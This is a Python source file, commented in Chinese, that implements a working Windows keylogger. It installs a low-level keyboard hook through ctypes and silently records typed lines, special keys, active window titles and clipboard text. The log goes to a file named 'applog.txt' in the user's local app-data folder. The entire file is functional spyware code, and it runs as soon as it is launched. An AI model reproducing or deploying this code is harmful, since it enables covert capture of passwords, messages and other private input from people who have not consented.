from ctypes import *
from ctypes.wintypes import DWORD, LPARAM, WPARAM, MSG
import logging
import os

logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), level=logging.DEBUG, format='%(message)s')

#加载所需库
user32 = windll.user32
kernel32 = windll.kernel32


current_window = None   # 窗口标题
current_clipboard = []  # 剪贴板内容
last_key = None         # 最后一个按键
line = ""               # 点击的键盘字符行

WH_KEYBOARD_LL = 13     # 键盘钩子用于
WM_KEYDOWN = 0x0100     # VM_KEYDOWN message code
HC_ACTION = 0           # KeyboardProc回调函数的参数


VIRTUAL_KEYS = {'RETURN': 0x0D,
                'CONTROL': 0x11,
                'SHIFT': 0x10,
                'MENU': 0x12,
                'TAB': 0x09,
                'BACKSPACE': 0x08,
                'CLEAR': 0x0C,
                'CAPSLOCK': 0x14,
                'ESCAPE': 0x1B,
                'HOME': 0x24,
                'INS': 0x2D,
                'DEL': 0x2E,
                'END': 0x23,
                'PRINTSCREEN': 0x2C,
                'CANCEL': 0x03
                }

HOOKPROC = WINFUNCTYPE(HRESULT, c_int, WPARAM, LPARAM)

class KBDLLHOOKSTRUCT(Structure): _fields_=[
    ('vkCode',DWORD),
    ('scanCode',DWORD),
    ('flags',DWORD),
    ('time',DWORD),
    ('dwExtraInfo',DWORD)]

class hook:

    #用于安装/卸载钩子

    def __init__(self):
        #调用user32.dll和kernel32.dll
        self.user32 = user32
        self.kernel32 = kernel32
        self.is_hooked = None


    def install_hook(self, ptr):
        #安装钩子
        self.is_hooked = self.user32.SetWindowsHookExA(
            WH_KEYBOARD_LL,
            ptr,
            kernel32.GetModuleHandleW(None),
            0
        )

        if not self.is_hooked:
            return False
        return True

    def uninstall_hook(self):
        #卸载钩子
        if self.is_hooked is None:
            return
        self.user32.UnhookWindowsHookEx(self.is_hooked)
        self.is_hooked = None

def get_current_window():    #抓取当前窗口标题
    #必需的WinAPI函数
    GetForegroundWindow = user32.GetForegroundWindow
    GetWindowTextLength = user32.GetWindowTextLengthW
    GetWindowText = user32.GetWindowTextW

    hwnd = GetForegroundWindow()    #获取当前窗口句柄
    length = GetWindowTextLength(hwnd)    #获取标题文本长度，将句柄乍为参数传递
    buff = create_unicode_buffer(length + 1)    #创建临时缓存buff用于存储标题文本

    GetWindowText(hwnd, buff, length + 1)    #获取窗口标题并存储在buff中

    return buff.value    #返回buff的值

def get_clipboard():

    CF_TEXT = 1    #设置剪贴板格式

    #GlobalLock/GlobalUnlock 参数与返回类型
    kernel32.GlobalLock.argtypes = [c_void_p]
    kernel32.GlobalLock.restype = c_void_p
    kernel32.GlobalUnlock.argtypes = [c_void_p]

    #GetClipboardData的返回类型
    user32.GetClipboardData.restype = c_void_p
    user32.OpenClipboard(0)

    #所需剪贴板函数
    IsClipboardFormatAvailable = user32.IsClipboardFormatAvailable
    GetClipboardData = user32.GetClipboardData
    CloseClipboard = user32.CloseClipboard

    try:
        if IsClipboardFormatAvailable(CF_TEXT):    #如果CF_TEXT可用
            data = GetClipboardData(CF_TEXT)    #获取剪贴板数据的句柄
            data_locked = kernel32.GlobalLock(data)    #获取指向数据所在的内存位置的指针
            text = c_char_p(data_locked)    #获取指向data_locked位置的char*(python中的字符串)指针
            value = text.value    #存储有用的值
            kernel32.GlobalUnlock(data_locked)    #递减锁计数
            return value.decode('gb18030')    #返回剪贴板的值
    finally:
        CloseClipboard()    #关闭剪贴板

def hook_procedure(nCode, wParam, lParam):

    # 声明全局变量，这样每次点击按键时被清空
    global last_key
    global current_clipboard
    global line
    global current_window

    if current_window != get_current_window():  #判断current_window内容不是当前打开的窗口
        current_window = get_current_window()   #将窗口标题放在current_window中
        logging.info('[WINDOW] ' + current_window)  #将当前窗口标题写入日志文件
        # print('[WINDOW] '+current_window)

        #如果你在测试时想卸载钩子，请删除下面注释
        """
        if user32.GetKeyState(VIRTUAL_KEYS['CONTROL']) & 0x8000:
            hook.uninstall_hook()
            return 0
        """

    if nCode == HC_ACTION and wParam == WM_KEYDOWN:
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
        state = (c_char * 256)()
        user32.GetKeyboardState(byref(state))
        buff = create_unicode_buffer(8)
        n = user32.ToUnicode(kb.vkCode, kb.scanCode, state, buff, 8 - 1, 0)    #ToUnicode返回值：-1/一个死键,0/不进行任何转换,1/一个字符,>=2/两个或多个字符
        key = wstring_at(buff)

        if n > 0:
            if kb.vkCode not in VIRTUAL_KEYS.values():    #如果键入非特殊键，则加入line变量
                line += key

            for key, value in VIRTUAL_KEYS.items():    #如果键入特殊键，则记录特殊键名
                if kb.vkCode == value:
                    logging.info(key)
                    # print(key)

            if kb.vkCode == VIRTUAL_KEYS['RETURN']:    #如果键入RETURN，则记录并清除line变量
                logging.info(line)
                # print(line)
                line = ""

            if current_clipboard != get_clipboard():    #如果剪贴板中有新数据，则记录该数据
                current_clipboard = get_clipboard()
                logging.info('[CLIPBOARD] ' + current_clipboard + '\n')
                # print('[CLIPBOARD] '+current_clipboard+'\n')

    return user32.CallNextHookEx(hook.is_hooked, nCode, wParam, lParam)    #将钩子信息传递给下个钩子过程CallNextHookEx

hook = hook()
ptr = HOOKPROC(hook_procedure)
hook.install_hook(ptr)
msg = MSG()
user32.GetMessageA(byref(msg), 0, 0, 0)